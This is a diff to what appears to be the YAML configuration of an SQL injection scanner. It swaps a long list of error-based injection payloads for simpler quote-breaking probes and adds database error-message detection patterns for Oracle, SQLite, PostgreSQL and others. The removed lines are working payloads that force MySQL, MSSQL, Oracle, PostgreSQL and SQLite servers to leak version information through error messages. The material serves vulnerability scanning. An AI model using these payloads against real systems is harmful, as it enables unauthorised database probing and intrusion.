@@ -6,78 +6,35 @@ transform:
     transformations:
       - replace_all_values_one_by_one:
           - "'"
-          - "'\"'"
-          - "' AND '"
-          - "\"--"
-          - "';"
+          - "\""
           - "')--"
-          - "\")"
-          - "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x716b6a6271,(SELECT (ELT(1=1,1))),0x7162706a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--"
-          - "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
-          - "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--"
-          - "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
-          - "' AND EXP(~(SELECT * FROM (SELECT version())a))--"
-          - "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version(),0x7e)) USING utf8)))--"
-          - "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1)--"
-          - "' AND 1=CAST((SELECT version()) AS int)--"
-          - "' AND 1=CAST(chr(126)||version()||chr(126) AS int)--"
-          - "';SELECT CAST(version() AS int)--"
-          - "' AND TO_NUMBER(version(),'9')=0--"
-          - "' AND 1=CONVERT(int,(SELECT @@version))--"
-          - "' AND 1=CONVERT(int,DB_NAME())--"
-          - "';DECLARE @v INT=CAST(@@version AS INT)--"
-          - "' AND 1=(SELECT TOP 1 CAST(name AS int) FROM sysobjects)--"
-          - "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--"
-          - "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--"
-          - "' AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH((SELECT banner FROM v$version WHERE ROWNUM=1))--"
-          - "' OR 1=ORDSYS.ORD_DICOM.GETMAPPINGXPATH((SELECT banner FROM v$version WHERE ROWNUM=1),user,user)--"
-          - "' AND 1=CAST(sqlite_version() AS int)--"
-          - "' UNION SELECT CAST(sqlite_version() AS int)--"
-          - "' AND TYPEOF(ZEROBLOB(-1))--"
+          - "\")--"
+          - "';--"
+          - "\";--"
+          - "'));"
+          - "' AND 1=CAST('abc' AS int)--"
   body:
     transformations:
       - replace_all_values_one_by_one:
           - "'"
-          - "'\"'"
-          - "' AND '"
-          - "\"--"
-          - "';"
+          - "\""
           - "')--"
-          - "\")"
-          - "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x716b6a6271,(SELECT (ELT(1=1,1))),0x7162706a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--"
-          - "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
-          - "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--"
-          - "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
-          - "' AND EXP(~(SELECT * FROM (SELECT version())a))--"
-          - "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version(),0x7e)) USING utf8)))--"
-          - "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1)--"
-          - "' AND 1=CAST((SELECT version()) AS int)--"
-          - "' AND 1=CAST(chr(126)||version()||chr(126) AS int)--"
-          - "';SELECT CAST(version() AS int)--"
-          - "' AND TO_NUMBER(version(),'9')=0--"
-          - "' AND 1=CONVERT(int,(SELECT @@version))--"
-          - "' AND 1=CONVERT(int,DB_NAME())--"
-          - "';DECLARE @v INT=CAST(@@version AS INT)--"
-          - "' AND 1=(SELECT TOP 1 CAST(name AS int) FROM sysobjects)--"
-          - "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--"
-          - "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--"
-          - "' AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH((SELECT banner FROM v$version WHERE ROWNUM=1))--"
-          - "' OR 1=ORDSYS.ORD_DICOM.GETMAPPINGXPATH((SELECT banner FROM v$version WHERE ROWNUM=1),user,user)--"
-          - "' AND 1=CAST(sqlite_version() AS int)--"
-          - "' UNION SELECT CAST(sqlite_version() AS int)--"
-          - "' AND TYPEOF(ZEROBLOB(-1))--"
+          - "\")--"
+          - "';--"
+          - "\";--"
+          - "'));"
+          - "' AND 1=CAST('abc' AS int)--"
   header:
     transformations:
       - replace_all_values_one_by_one:
           - "'"
-          - "'\"'"
-          - "' AND '"
-          - "\"--"
-          - "';"
-          - "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
-          - "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--"
-          - "' AND 1=CAST((SELECT version()) AS int)--"
-          - "' AND 1=CONVERT(int,(SELECT @@version))--"
+          - "\""
+          - "')--"
+          - "\")--"
+          - "';--"
+          - "\";--"
+          - "'));"
+          - "' AND 1=CAST('abc' AS int)--"
 
 match_on:
   body:
@@ -95,7 +52,6 @@ match_on:
         options:
           regex: true
       - "Duplicate entry '"
-      - "XPATH syntax error: '~"
       - "XPATH syntax error: '~"
       - "Got error 'repeated'"
       - value: 'Double value out of range in ''exp\(~'
@@ -127,14 +83,18 @@ match_on:
         options:
           regex: true
 
+      # ── Oracle ──────────────────────────────────────────────────────────────
+      - "ORA-00904:"
       - "ORA-00907:"
       - "ORA-00933:"
       - "ORA-00936:"
+      - "ORA-01031:"
+      - "ORA-01722:"
       - "ORA-01756:"
       - "ORA-01789:"
       - "ORA-06512:"
-      - "ORA-29257:"
       - "ORA-20001:"
+      - "ORA-29257:"
       - value: 'oracle\.jdbc\.driver\.OracleDriver'
         options:
           regex: true
@@ -142,30 +102,33 @@ match_on:
         options:
           regex: true
 
+      # ── SQLite ───────────────────────────────────────────────────────────────
       - "SQLITE_ERROR SQL error or missing database"
+      - "[SQLITE_ERROR]"
+      - "SQLITE_CONSTRAINT"
+      - "SQLite3::Exception:"
+      - "SQLiteException"
+      - "SqliteError"
+      - "SqliteException"
       - value: 'SQLite3::query\(\): Unable to execute a query'
         options:
           regex: true
       - value: 'sqlite3\.OperationalError:'
         options:
           regex: true
-      - "unrecognized token: \\\"'"
-      - value: 'near \"\.\":\ syntax error'
+      - 'unrecognized token: "'
+      - value: 'near "\.":\ syntax error'
         options:
           regex: true
-      - "[SQLITE_ERROR]"
-      - "SQLite3::Exception:"
-      - "SQLiteException"
       - "no such table:"
       - "no such column:"
       - "has no column named"
-      - "SQLITE_CONSTRAINT"
 
       - "org.h2.jdbc.JdbcSQLSyntaxErrorException"
       - "Syntax error in SQL statement"
       - "org.h2.message.DbException"
 
-      - "Unexpected token"
+      # ── HSQLDB ───────────────────────────────────────────────────────────────
       - "user lacks privilege or object not found"
       - "org.hsqldb.jdbc.JDBCDriver"
 
@@ -212,12 +175,40 @@ match_on:
       - value: 'System\.Data\.SqlClient\.SqlException'
         options:
           regex: true
+      - value: 'Microsoft\.Data\.SqlClient\.SqlException'
+        options:
+          regex: true
       - value: 'Npgsql\.NpgsqlException'
+        options:
+          regex: true
+      - value: 'Npgsql\.PostgresException'
+        options:
+          regex: true
+      - value: 'PSQLException'
         options:
           regex: true
       - "ActiveRecord::StatementInvalid"
       - "PG::SyntaxError:"
+      - "PG::UndefinedTable:"
+      - "PG::UndefinedColumn:"
       - value: 'Caused by: java\.sql\.SQLSyntaxErrorException'
+        options:
+          regex: true
+      - value: 'pq: syntax error at or near'
+        options:
+          regex: true
+      - value: 'cockroachdb.*syntax error'
+        options:
+          regex: true
+      - value: 'com\.datastax\.driver'
+        options:
+          regex: true
+      - "com.datastax.oss.driver.api.core.servererrors.SyntaxError"
+      - value: 'mysqli_sql_exception'
+        options:
+          regex: true
+      - "DatabaseError"
+      - value: 'QueryException'
         options:
           regex: true
 
